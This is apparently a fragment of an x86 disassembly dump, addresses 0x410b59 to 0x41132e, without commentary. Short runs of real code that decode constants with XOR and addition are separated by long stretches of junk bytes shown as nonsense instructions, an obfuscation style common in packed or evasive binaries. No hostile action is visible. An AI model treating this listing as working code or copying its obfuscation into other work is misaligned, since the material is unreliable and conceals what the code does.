  410b59:	inc    edi
  410b5a:	sbb    eax,0xa2e2126b
  410b5f:	(bad)  
  410b60:	loop   0x410b66
  410b62:	jo     0x410bc9
  410b64:	and    edx,0x1c
  410b67:	jo     0x410af7
  410b69:	loope  0x410b9e
  410b6b:	ja     0x410afe
  410b6d:	or     DWORD PTR [edx-0x21178b07],ecx
  410b73:	fwait
  410b74:	(bad)  
  410b75:	mul    dl
  410b77:	dec    edx
  410b78:	out    0xa1,eax
  410b7a:	mov    dh,0xf5
  410b7c:	aaa    
  410b7d:	std    
  410b7e:	mov    edx,0x8164c145
  410b83:	dec    ebx
  410b84:	pop    esp
  410b85:	out    0x42,eax
  410b87:	jae    0x410bcb
  410b89:	xor    al,0x4a
  410b8b:	out    0xcb,eax
  410b8d:	lahf   
  410b8e:	inc    esi
  410b8f:	out    0x6,eax
  410b91:	push   ss
  410b92:	xor    BYTE PTR [ebx+0x1],ch
  410b95:	ret    0x9234
  410b98:	xchg   ebx,ecx
  410b9a:	cmp    esp,DWORD PTR [edx-0x7757e41c]
  410ba0:	pop    ds
  410ba1:	xlat   BYTE PTR ds:[ebx]
  410ba2:	xchg   edi,eax
  410ba3:	cmp    ecx,esp
  410ba5:	stc    
  410ba6:	(bad)  
  410ba7:	jmp    0x7676:0x6f0e0f57
  410bae:	jg     0x410b50
  410bb0:	js     0x410b49
  410bb2:	repz jp 0x410bd4
  410bb5:	mov    ebx,0xb881b09
  410bba:	sbb    eax,0x24336c63
  410bbf:	jmp    0xbbd3:0x64e24245
  410bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc7:	push   ss
  410bc8:	sbb    eax,0x66621faf
  410bce:	(bad)  
  410bcf:	mov    ds:0x38befc61,eax
  410bd4:	ins    DWORD PTR es:[edi],dx
  410bd5:	xchg   esi,eax
  410bd6:	test   BYTE PTR [ebx-0x36ab52c7],al
  410bdc:	jbe    0x410c04
  410bde:	xchg   edx,eax
  410bdf:	mov    ds:0xaced5a44,eax
  410be4:	mov    eax,ds:0xcd7a6afa
  410be9:	jecxz  0x410b88
  410beb:	(bad)  
  410bec:	je     0x410c4a
  410bee:	sub    bh,BYTE PTR [eax+0x6f]
  410bf1:	mov    dh,0x6e
  410bf3:	or     dh,BYTE PTR [ebp+0x42f7de9c]
  410bf9:	sub    DWORD PTR [edx],ebp
  410bfb:	fmul   st(3),st
  410bfd:	sbb    BYTE PTR [edi+0x2de147f1],al
  410c03:	adc    eax,0x1bd8fd97
  410c08:	or     ebx,ebp
  410c0a:	rcl    esi,1
  410c0c:	repnz loope 0x410ba3
  410c0f:	inc    edx
  410c10:	js     0x410bf4
  410c12:	pop    ss
  410c13:	mov    al,0x66
  410c15:	aas    
  410c16:	data16 shl BYTE PTR [esi+0x17],0x48
  410c1b:	dec    ecx
  410c1c:	pop    ebx
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	pop    esi
  410c86:	jae    0x410cfe
  410c88:	xor    al,0x37
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410c37
  410c92:	pop    ebp
  410c93:	jp     0x410ceb
  410c95:	call   0xef4c:0x7ca6e8c8
  410c9c:	add    ebx,esp
  410c9e:	xchg   esp,eax
  410c9f:	adc    DWORD PTR [esi+0x58],ebp
  410ca2:	cwde   
  410ca3:	daa    
  410ca4:	bound  edi,QWORD PTR [esp+edi*4-0x14f45bd0]
  410cab:	or     eax,0xfbef6260
  410cb0:	inc    ebx
  410cb1:	pop    ss
  410cb2:	xchg   edi,eax
  410cb3:	rcl    DWORD PTR [ecx],cl
  410cb5:	bnd call 0x32845dc3
  410cbb:	pop    ebx
  410cbc:	or     cl,BYTE PTR [ecx-0x65]
  410cbf:	pop    edx
  410cc0:	cmp    eax,0xdbdc8837
  410cc5:	jge    0x410c50
  410cc7:	xor    al,0xd0
  410cc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cca:	cld    
  410ccb:	pusha  
  410ccc:	cmp    ebp,esi
  410cce:	sbb    al,0xb5
  410cd0:	das    
  410cd1:	inc    esp
  410cd2:	addr16 inc edx
  410cd4:	imul   DWORD PTR [edi-0x11373d18]
  410cda:	shl    BYTE PTR [ebx],0x4a
  410cdd:	ror    DWORD PTR [esi+0x61b4df10],0xc9
  410ce4:	inc    ebp
  410ce5:	sub    esp,ecx
  410ce7:	jae    0x410c9c
  410ce9:	int3   
  410cea:	test   DWORD PTR [ebp+0x41],eax
  410ced:	lds    ecx,FWORD PTR [edx+ebp*1+0x5f]
  410cf1:	push   ss
  410cf2:	std    
  410cf3:	leave  
  410cf4:	xchg   edx,eax
  410cf5:	(bad)  
  410cf6:	jo     0x410ca8
  410cf8:	ret    0x5fad
  410cfb:	ud0    esi,ebp
  410cfe:	out    dx,al
  410cff:	out    0xb0,eax
  410d01:	xchg   ebx,eax
  410d02:	mov    edi,0xe4c58d6f
  410d07:	dec    ecx
  410d08:	sub    ch,cl
  410d0a:	jmp    0x410ce2
  410d0c:	sub    ecx,DWORD PTR [edx]
  410d0e:	push   cs
  410d0f:	jb     0x410d3f
  410d11:	push   esp
  410d12:	pop    eax
  410d13:	mov    ebp,0xe90bc0a2
  410d18:	jg     0x410d08
  410d1a:	scas   al,BYTE PTR es:[edi]
  410d1b:	jl     0x410ce9
  410d1d:	or     esi,DWORD PTR [esi]
  410d1f:	add    DWORD PTR [edx+ebx*4],eax
  410d22:	sar    DWORD PTR [edi-0xa],cl
  410d25:	in     eax,0xf6
  410d27:	dec    edi
  410d28:	out    0xf4,eax
  410d2a:	xor    bh,BYTE PTR [edi+0x332e6eda]
  410d30:	div    esi
  410d32:	ja     0x410d08
  410d34:	rcl    BYTE PTR [esp+eiz*2-0x2de4a9fd],1
  410d3b:	and    BYTE PTR [ecx-0x35],dh
  410d3e:	sbb    eax,DWORD PTR [ecx]
  410d40:	cs pop edi
  410d42:	push   eax
  410d43:	push   es
  410d44:	test   eax,0x766758cb
  410d49:	ja     0x410ce9
  410d4b:	ret    0xb8cf
  410d4e:	dec    ebp
  410d4f:	mov    dh,0xcb
  410d51:	call   0xbb9b:0xf62febb1
  410d58:	sbb    cl,bl
  410d5a:	ja     0x410da2
  410d5c:	in     al,dx
  410d5d:	int3   
  410d5e:	xor    ah,BYTE PTR [edi+ebp*2]
  410d61:	push   ecx
  410d62:	call   0x830a:0x523492a0
  410d69:	mov    eax,ds:0xab07e9f5
  410d6e:	fsubr  QWORD PTR [ebx+0x4b7de541]
  410d74:	mov    ch,0xc6
  410d76:	cmp    eax,0x12b2485f
  410d7b:	add    DWORD PTR [edx-0x80],0x89846353
  410d82:	js     0x410d63
  410d84:	ins    DWORD PTR es:[edi],dx
  410d85:	push   0xffffff85
  410d87:	mov    ecx,DWORD PTR [ecx+0x7dc32e2d]
  410d8d:	cmp    ecx,DWORD PTR [ecx+0xa2d17bc]
  410d93:	cmp    esp,DWORD PTR [ebx]
  410d95:	stc    
  410d96:	dec    ebx
  410d97:	jecxz  0x410de4
  410d99:	jp     0x410dfb
  410d9b:	stos   BYTE PTR es:[edi],al
  410d9c:	cld    
  410d9d:	and    DWORD PTR [edi+eiz*1],esi
  410da0:	inc    ebp
  410da1:	rcl    edx,cl
  410da3:	scas   eax,DWORD PTR es:[edi]
  410da4:	int    0x4f
  410da6:	or     dl,BYTE PTR [eax+0x1223c736]
  410dac:	sbb    dh,BYTE PTR [edx+eax*1]
  410daf:	mov    ecx,0x7510853
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x4286a00],esi
  410e04:	int3   
  410e05:	aad    0x47
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410ded
  410e0e:	fbstp  TBYTE PTR [ebp+0x2e]
  410e11:	xchg   edx,eax
  410e12:	sbb    BYTE PTR [eax+0x0],dl
  410e15:	sbb    BYTE PTR ds:0x5c22b306,al
  410e1b:	repz sbb ecx,DWORD PTR ds:0xdca593b
  410e22:	mov    dl,0xa2
  410e24:	call   0x3f72:0x28dffe62
  410e2b:	leave  
  410e2c:	gs mov dl,0x77
  410e2f:	cld    
  410e30:	push   cs
  410e31:	ja     0x410dc0
  410e33:	mov    WORD PTR [eax-0x44b2f6b8],cs
  410e39:	bnd jns 0x410df0
  410e3c:	lods   al,BYTE PTR ds:[esi]
  410e3d:	sbb    cl,BYTE PTR [ebx-0x30b02053]
  410e43:	and    dl,bl
  410e45:	out    0x30,al
  410e47:	sub    al,BYTE PTR ds:0x416a0199
  410e4d:	retf   
  410e4e:	out    dx,al
  410e4f:	stc    
  410e50:	out    0x4,eax
  410e52:	push   ebx
  410e53:	xor    ebx,DWORD PTR [edx+ebx*4]
  410e56:	mov    cs,WORD PTR [edx+0x25c2308e]
  410e5c:	or     bl,dh
  410e5e:	push   edi
  410e5f:	xor    ah,BYTE PTR [esi-0x6a5ec24d]
  410e65:	mov    al,0x49
  410e67:	inc    ecx
  410e68:	adc    al,0x84
  410e6a:	hlt    
  410e6b:	inc    edx
  410e6c:	sar    BYTE PTR [esi],0x3e
  410e6f:	push   edx
  410e70:	(bad)  
  410e71:	mov    edx,0x26d52d2e
  410e76:	push   esi
  410e77:	jae    0x410e36
  410e79:	ins    BYTE PTR es:[edi],dx
  410e7a:	xchg   DWORD PTR [eax+0x445f47f7],esp
  410e80:	inc    eax
  410e81:	mov    eax,ds:0x55eab5ce
  410e86:	retf   
  410e87:	mov    cl,0xb1
  410e89:	test   BYTE PTR [edx+0x22afbb39],bl
  410e8f:	xor    al,0x15
  410e91:	and    al,0xb2
  410e93:	cmc    
  410e94:	inc    edi
  410e95:	push   cs
  410e96:	jl     0x410ed8
  410e98:	mov    ecx,0xab7eae81
  410e9d:	sbb    cl,BYTE PTR [esi]
  410e9f:	dec    ebx
  410ea0:	jb     0x410ee9
  410ea2:	fisubr DWORD PTR [edi+0x49490cea]
  410ea8:	hlt    
  410ea9:	xor    eax,0x9335c9dc
  410eae:	mov    ecx,0xa6f78e38
  410eb3:	add    DWORD PTR [ebp+0x7aa0dabe],ecx
  410eb9:	test   DWORD PTR [ebx],edx
  410ebb:	jb     0x410f27
  410ebd:	jno    0x410ef6
  410ebf:	imul   ebx,DWORD PTR [ebp-0x6978ab5c],0x5c
  410ec6:	xchg   BYTE PTR [eax],al
  410ec8:	neg    DWORD PTR [esi+edi*4-0x7b]
  410ecc:	fsubr  QWORD PTR ds:0xf91da650
  410ed2:	rcl    DWORD PTR [ecx+0x7e13fdd7],0xbe
  410ed9:	cli    
  410eda:	daa    
  410edb:	repz sbb edx,DWORD PTR ds:0xcdab4fac
  410ee2:	mov    eax,ds:0xe30b736e
  410ee7:	pop    ss
  410ee8:	adc    esi,DWORD PTR [edi-0x77d7d36b]
  410eee:	sbb    DWORD PTR [edx-0x69],ebp
  410ef1:	shl    dh,0x50
  410ef4:	mov    bh,0x1d
  410ef6:	in     eax,0xdf
  410ef8:	push   esi
  410ef9:	xor    BYTE PTR [ecx+0xfc73dea],al
  410eff:	add    al,0x37
  410f01:	pop    ds
  410f02:	lods   eax,DWORD PTR ds:[esi]
  410f03:	sbb    eax,0x884d1a3b
  410f08:	rcl    BYTE PTR [edi+0xf],0x8
  410f0c:	mov    bl,BYTE PTR [eax]
  410f0e:	push   esi
  410f0f:	icebp  
  410f10:	popf   
  410f11:	int    0x4f
  410f13:	ins    BYTE PTR es:[edi],dx
  410f14:	jg     0x410f1d
  410f16:	daa    
  410f17:	sar    BYTE PTR [ebx],cl
  410f19:	shl    DWORD PTR [edx],cl
  410f1b:	js     0x410f1e
  410f1d:	mov    eax,0x107fd54a
  410f22:	ins    DWORD PTR es:[edi],dx
  410f23:	xchg   edx,eax
  410f24:	inc    esi
  410f25:	inc    esp
  410f26:	add    al,BYTE PTR [eax+ebp*4-0x51]
  410f2a:	add    eax,0xaf0fc603
  410f2f:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	mov    edi,0xeb9ca90e
  410f4e:	inc    esi
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410ed9
  410f56:	jp     0x410f0c
  410f58:	xchg   esp,eax
  410f59:	out    0x2f,al
  410f5b:	cs jl  0x410fd0
  410f5e:	(bad)  
  410f5f:	scas   eax,DWORD PTR es:[edi]
  410f60:	mov    bl,0xe7
  410f62:	mov    ah,bl
  410f64:	(bad)  
  410f65:	jae    0x410fe4
  410f67:	push   es
  410f68:	lock in eax,dx
  410f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f6b:	cwde   
  410f6c:	loope  0x410ef0
  410f6e:	pop    esi
  410f6f:	jge    0x410f69
  410f71:	std    
  410f72:	popa   
  410f73:	outs   dx,BYTE PTR ds:[esi]
  410f74:	mov    esp,es
  410f76:	loop   0x410f3c
  410f78:	int    0x81
  410f7a:	push   ecx
  410f7b:	out    0x8a,al
  410f7d:	(bad)  ds:0x938076b5
  410f83:	retf   
  410f84:	cwde   
  410f85:	xchg   BYTE PTR [ebp-0x44],dh
  410f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f89:	pop    es
  410f8a:	retf   
  410f8b:	adc    dl,BYTE PTR [eax-0x42352e4a]
  410f91:	sub    eax,0xe2946091
  410f96:	lods   eax,DWORD PTR ds:[esi]
  410f97:	xor    eax,0xb6687888
  410f9c:	xchg   ebx,eax
  410f9d:	cmp    DWORD PTR [eax],0xfffffffa
  410fa0:	scas   eax,DWORD PTR es:[edi]
  410fa1:	jns    0x410f9d
  410fa3:	mov    al,ds:0xdcf33ff7
  410fa8:	xor    eax,0x962522b8
  410fad:	sub    ah,BYTE PTR [edx+0x2aa4d28b]
  410fb3:	mov    ebx,0xf840559a
  410fb8:	sbb    ebx,DWORD PTR [ebp-0x55]
  410fbb:	jmp    0x4ad76e8b
  410fc0:	stos   DWORD PTR es:[edi],eax
  410fc1:	in     eax,dx
  410fc2:	popa   
  410fc3:	mov    es,ebp
  410fc5:	lds    edx,FWORD PTR [edi+0x1641da2b]
  410fcb:	(bad)  
  410fcc:	push   ds
  410fcd:	rol    DWORD PTR [eax+esi*4-0x3cad4943],1
  410fd4:	cmp    eax,0xdff4ee4d
  410fd9:	sbb    BYTE PTR [ebp-0x4a],0xd8
  410fdd:	jmp    0x67214764
  410fe2:	jg     0x411036
  410fe4:	or     dl,al
  410fe6:	sbb    edx,DWORD PTR gs:0xc860bc3a
  410fed:	cmp    BYTE PTR [ecx],bl
  410fef:	cmp    eax,0xf7b5bee6
  410ff4:	mov    dh,0x29
  410ff6:	js     0x411035
  410ff8:	dec    ebp
  410ff9:	push   esp
  410ffa:	xchg   ecx,eax
  410ffb:	mov    dh,0xfc
  410ffd:	sub    ebx,DWORD PTR [edx-0x15]
  411000:	push   esi
  411001:	inc    eax
  411002:	lahf   
  411003:	leave  
  411004:	cmp    ebp,DWORD PTR [ebx]
  411006:	arpl   WORD PTR [edx-0x6cca75a7],bx
  41100c:	push   0xffffffb9
  41100e:	imul   edi,edi,0x33
  411011:	push   ss
  411012:	add    bl,bl
  411014:	pop    esi
  411015:	adc    dl,BYTE PTR [esi+0x6f8f5866]
  41101b:	xchg   ebp,eax
  41101c:	or     ecx,edx
  41101e:	aas    
  41101f:	fadd   DWORD PTR [edx-0x68]
  411022:	fisubr DWORD PTR ds:0xb92c7ee8
  411028:	adc    DWORD PTR [ebx+0x17],edi
  41102b:	in     eax,dx
  41102c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41102d:	xlat   BYTE PTR ds:[ebx]
  41102e:	hlt    
  41102f:	mov    edx,0xfad0ccad
  411034:	fbstp  TBYTE PTR [edx+0x141fb431]
  41103a:	cld    
  41103b:	repnz fs xchg ebx,eax
  41103e:	xchg   esp,eax
  41103f:	aaa    
  411040:	pop    ebx
  411041:	fucomp st(3)
  411043:	test   BYTE PTR [esi-0x7b],0x39
  411047:	ror    dh,0x4
  41104a:	push   es
  41104b:	add    BYTE PTR [esi-0x1a],bl
  41104e:	pop    edx
  41104f:	ret    0x6725
  411052:	pop    ss
  411053:	pop    ds
  411054:	aas    
  411055:	shr    BYTE PTR [esi+0xe24a47f],0x48
  41105c:	dec    ecx
  41105d:	es mov ds,edx
  411060:	pusha  
  411061:	(bad)  
  411062:	and    al,0x4d
  411064:	push   edx
  411065:	xchg   BYTE PTR [ebp-0x6c58baf2],bh
  41106b:	xchg   BYTE PTR [esi+0x1],cl
  41106e:	xor    al,dh
  411070:	je     0x411056
  411072:	bound  ecx,QWORD PTR [ebp+0x729a0a8c]
  411078:	xor    al,BYTE PTR [eax]
  41107a:	cmp    ecx,eax
  41107c:	jne    0x410c67
  411082:	mov    ebx,esi
  411084:	jmp    0x41108e
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	jns    0x41109c
  4110b3:	loope  0x4110ec
  4110b5:	mov    DWORD PTR [ecx+0x7c],eax
  4110b8:	jl     0x4110cc
  4110ba:	jg     0x411138
  4110bc:	jl     0x4110cf
  4110be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110bf:	inc    edi
  4110c0:	mov    esi,0xc31753a6
  4110c5:	xor    esp,edx
  4110c7:	or     DWORD PTR [ebx-0x473584a1],eax
  4110cd:	xchg   esp,eax
  4110ce:	mov    BYTE PTR [ebx-0x61],ah
  4110d1:	xchg   BYTE PTR [ecx],ch
  4110d3:	jae    0x4110ee
  4110d5:	clc    
  4110d6:	enter  0x2d98,0xc7
  4110da:	dec    esi
  4110db:	push   edx
  4110dc:	adc    esi,esi
  4110de:	mov    esp,0x6416316c
  4110e3:	sbb    DWORD PTR [ebp-0x2696d8e1],ebx
  4110e9:	inc    eax
  4110ea:	dec    esp
  4110eb:	sbb    bl,BYTE PTR [eax]
  4110ed:	mov    cl,BYTE PTR [ebp+0x376a72c6]
  4110f3:	xor    esp,DWORD PTR ds:0x76693d9e
  4110f9:	mov    bl,0x76
  4110fc:	stos   BYTE PTR es:[edi],al
  4110fd:	dec    eax
  4110fe:	jge    0x41114f
  411100:	mov    edx,DWORD PTR [ebx]
  411102:	adc    eax,0x49104c16
  411107:	pop    eax
  411108:	cmp    dl,al
  41110a:	xchg   ecx,eax
  41110b:	pop    ebp
  41110c:	mov    DWORD PTR [ebx+0x10],edx
  41110f:	arpl   WORD PTR [ebx+0x66],bx
  411112:	sub    ebx,DWORD PTR [esi]
  411114:	popa   
  411115:	dec    edi
  411116:	sahf   
  411117:	jnp    0x411177
  411119:	add    edi,DWORD PTR [eax+edx*8]
  41111c:	sub    edx,DWORD PTR [ebx-0x2e94bec1]
  411122:	dec    esp
  411123:	shl    esp,1
  411125:	es in  eax,dx
  411127:	push   di
  411129:	ss daa 
  41112b:	mov    al,ds:0x16c881c
  411130:	jnp    0x411184
  411132:	pop    ds
  411133:	nop
  411134:	pop    edi
  411135:	adc    edi,DWORD PTR ds:0x1257c82d
  41113b:	gs jno 0x4110c0
  41113e:	mov    eax,0x32eec0b9
  411143:	mov    ah,0x25
  411145:	out    dx,al
  411146:	(bad)  
  411147:	adc    BYTE PTR [ebx+0x49],ah
  41114a:	stos   BYTE PTR es:[edi],al
  41114b:	int3   
  41114c:	sti    
  41114d:	xor    BYTE PTR [esi],ah
  41114f:	outs   dx,DWORD PTR ds:[esi]
  411150:	mov    ah,0x5
  411152:	in     al,dx
  411153:	pushf  
  411154:	inc    ebx
  411155:	rol    dl,1
  411157:	cmp    ecx,eax
  411159:	inc    esp
  41115a:	sbb    BYTE PTR [edx+0x4d],dl
  41115d:	sbb    eax,0xb3b47f86
  411162:	xor    ch,BYTE PTR [edi]
  411164:	push   0xa14bb1c5
  411169:	adc    esp,edi
  41116b:	dec    edx
  41116c:	ja     0x4111a4
  41116e:	or     edx,DWORD PTR [esi]
  411170:	lock outs dx,DWORD PTR ds:[esi]
  411172:	adc    eax,0x4eff5244
  411177:	xchg   cl,al
  411179:	push   edi
  41117a:	dec    eax
  41117b:	push   eax
  41117c:	xor    ecx,DWORD PTR [eax+0x4d]
  41117f:	hlt    
  411180:	fiadd  DWORD PTR [ecx]
  411182:	rcr    BYTE PTR [edx-0x1edee999],cl
  411188:	test   DWORD PTR [eax+0x29],ecx
  41118b:	sbb    BYTE PTR [edx-0x5f],cl
  41118e:	push   es
  41118f:	dec    ecx
  411190:	lahf   
  411191:	adc    ebp,DWORD PTR [ecx]
  411193:	idiv   DWORD PTR [edi-0x73]
  411196:	and    eax,0x775dc70
  41119b:	das    
  41119c:	jns    0x4111e7
  41119e:	scas   al,BYTE PTR es:[edi]
  41119f:	xor    al,0x4d
  4111a1:	sbb    DWORD PTR [ebx+edi*8],ecx
  4111a4:	jae    0x4111a4
  4111a6:	add    al,BYTE PTR [ebp+0x47dec970]
  4111ac:	add    edi,DWORD PTR gs:[esi-0x1f4dcfd2]
  4111b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b4:	adc    ebp,DWORD PTR [esi+0x23f19cee]
  4111ba:	mov    dh,0xeb
  4111bc:	pushf  
  4111bd:	or     DWORD PTR [ecx],edx
  4111bf:	and    DWORD PTR [edx+edi*4],ebp
  4111c2:	in     al,dx
  4111c3:	mov    bh,0xd
  4111c5:	xacquire xchg BYTE PTR [ecx+0x56],cl
  4111c9:	orps   xmm4,XMMWORD PTR [eax+0x803f78d]
  4111d0:	dec    edi
  4111d1:	out    dx,eax
  4111d2:	xchg   edx,eax
  4111d4:	push   0x70
  4111d6:	out    0xd9,eax
  4111d8:	int    0x74
  4111da:	add    bx,WORD PTR [eax]
  4111dd:	call   ebx
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0xa45a,0xb3
  4111ff:	add    al,0x2e
  411201:	scas   eax,DWORD PTR es:[edi]
  411202:	inc    eax
  411203:	jl     0x411281
  411205:	adc    bh,BYTE PTR [edi+0x7c]
  411208:	jl     0x4111bc
  41120a:	loope  0x4111d6
  41120c:	in     eax,0x95
  41120e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41120f:	inc    edi
  411210:	jb     0x411225
  411212:	pop    edi
  411213:	jno    0x411195
  411215:	mov    esp,0xe8b0493
  41121a:	mov    dl,0xcd
  41121c:	test   DWORD PTR [ebx+0x5b39f5a],edx
  411222:	pop    es
  411223:	jge    0x4111c4
  411225:	inc    edi
  411226:	inc    ebp
  411227:	adc    cl,BYTE PTR [edx]
  411229:	mov    ds:0xee062f60,al
  41122e:	hlt    
  41122f:	pop    esp
  411230:	icebp  
  411231:	addr16 push edx
  411233:	jmp    DWORD PTR [eax-0x2167d1ae]
  411239:	and    esi,DWORD PTR [eax-0x2942d53a]
  41123f:	cmp    eax,0xdbf0271
  411244:	sub    eax,0xe09c4204
  411249:	jmp    0x411234
  41124b:	dec    esi
  41124c:	pushf  
  41124d:	adc    al,0x55
  41124f:	mov    eax,ds:0xacdef479
  411254:	ds call 0xc244:0xa9104c1c
  41125c:	in     eax,dx
  41125d:	mov    BYTE PTR [eax+0x0],dh
  411260:	mov    al,ds:0x58fe179f
  411265:	mov    ch,BYTE PTR [esi+0x51554c32]
  41126b:	pop    esi
  41126c:	pusha  
  41126d:	sub    ecx,DWORD PTR [edi-0x188ce43]
  411273:	dec    ebp
  411274:	je     0x411227
  411276:	mov    cl,0xe6
  411278:	xchg   edi,eax
  411279:	retf   
  41127a:	inc    esi
  41127b:	xchg   BYTE PTR [ecx],bh
  41127d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127e:	inc    eax
  41127f:	adc    eax,0x6444d164
  411284:	or     al,0x83
  411286:	ror    DWORD PTR [esi-0x2d],0xe8
  41128a:	add    eax,0x25e8e61
  41128f:	mov    bl,BYTE PTR [ebp+0x48657862]
  411295:	inc    ebx
  411296:	dec    ebx
  411297:	mov    edi,0x82e62094
  41129c:	mov    ah,0xbf
  41129e:	pop    eax
  41129f:	cdq    
  4112a0:	in     al,0x11
  4112a2:	jp     0x411308
  4112a4:	addr16 dec esp
  4112a6:	ret    0xa3fe
  4112a9:	pop    edi
  4112aa:	push   ss
  4112ab:	xor    cl,BYTE PTR ds:0x9150d43e
  4112b1:	fnstsw WORD PTR gs:[ecx-0x5f8a1dfa]
  4112b8:	inc    eax
  4112b9:	ficom  DWORD PTR [eax+0x6688d1f8]
  4112bf:	fist   DWORD PTR [esp+eiz*4]
  4112c2:	aas    
  4112c3:	out    0xa2,eax
  4112c5:	push   0x44
  4112c7:	lods   eax,DWORD PTR ds:[esi]
  4112c8:	adc    cl,BYTE PTR [edi]
  4112ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112cb:	mov    ch,0x9f
  4112cd:	outs   dx,DWORD PTR ds:[esi]
  4112ce:	js     0x4112d3
  4112d0:	xchg   ebp,eax
  4112d1:	ins    DWORD PTR es:[edi],dx
  4112d2:	imul   eax,DWORD PTR [eax+0x42c292a7],0xad2a3313
  4112dc:	push   edx
  4112dd:	inc    edi
  4112de:	sub    dh,BYTE PTR [edx+0x4f721752]
  4112e4:	mov    esp,0x8f0d528d
  4112e9:	leave  
  4112ea:	lock mov cl,0xfa
  4112ed:	ja     0x411335
  4112ef:	int    0xc7
  4112f1:	mov    ds:0x79c8f5e4,eax
  4112f6:	dec    ebx
  4112f7:	mov    ebp,0x46d36774
  4112fc:	mov    bh,0xec
  4112fe:	xchg   edx,eax
  4112ff:	cld    
  411300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411301:	test   DWORD PTR [ecx],esp
  411303:	stos   DWORD PTR es:[edi],eax
  411304:	mov    ds:0xe574e8c7,eax
  411309:	gs dec edx
  41130b:	pop    eax
  41130c:	shl    DWORD PTR ss:[eax-0x1e],0x73
  411311:	sbb    dl,BYTE PTR [ebx+eax*2]
  411314:	dec    eax
  411315:	outs   dx,BYTE PTR ds:[esi]
  411316:	icebp  
  411317:	xor    bh,ch
  411319:	popf   
  41131a:	lods   al,BYTE PTR ds:[esi]
  41131b:	imul   ebp,DWORD PTR [ebp-0x16f4a40],0xc47cbbbe
  411325:	cdq    
  411326:	std    
  411327:	push   0xa
  411329:	pop    ecx
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
